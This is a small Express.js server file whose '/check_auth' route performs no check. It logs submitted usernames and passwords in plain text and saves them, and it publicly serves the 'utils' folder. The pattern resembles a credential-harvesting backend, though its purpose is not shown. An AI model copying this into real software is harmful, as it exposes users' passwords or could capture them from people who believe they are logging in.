import express from "express";
const app = express();
import path from 'path';
import bodyParser from 'body-parser'
import { setData } from "./utils/dataManager.js";


const __dirname = path.resolve(path.dirname(""));

// parse application/json
app.use(bodyParser.json())

app.use('/utils', express.static(path.join(__dirname, 'utils')));

app.get('/', async (req, res)=>{
    res.sendFile(path.join(__dirname, '/index.html'));
})

app.post('/check_auth', (req, res)=>{
    const {username, password} = req.body;
    console.log(username, password)
    setData({username, password})
    res.send({
        status: 200,
        message: 'saved'
    })
})

app.listen(3000)